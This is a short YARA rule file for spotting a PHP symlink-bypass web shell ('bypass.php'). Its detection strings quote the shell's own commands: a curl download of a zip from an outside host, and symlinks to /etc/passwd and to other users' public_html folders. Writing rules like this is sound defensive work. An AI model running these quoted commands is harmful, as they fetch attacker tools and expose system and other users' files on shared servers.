/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-24
   Identifier: shell5
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_24_18_shell5_symlink_bypass {
   meta:
      description = "shell5 - file bypass.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-24"
      hash1 = "ab49973d4e68b5230e50bc76ec10bccfe3511476232c8ae1ffdc4f17abdfe77b"
   strings:
      $x1 = "@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');" fullword ascii
      $s5 = "@exec('./ln -s /etc/passwd 1.txt');" fullword ascii
      $s6 = "@exec('ln -s /etc/passwd 1.txt');" fullword ascii
      $s8 = "@exec('./ln -s /home/'.$user3.'/public_html ' . $user3);" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 200KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

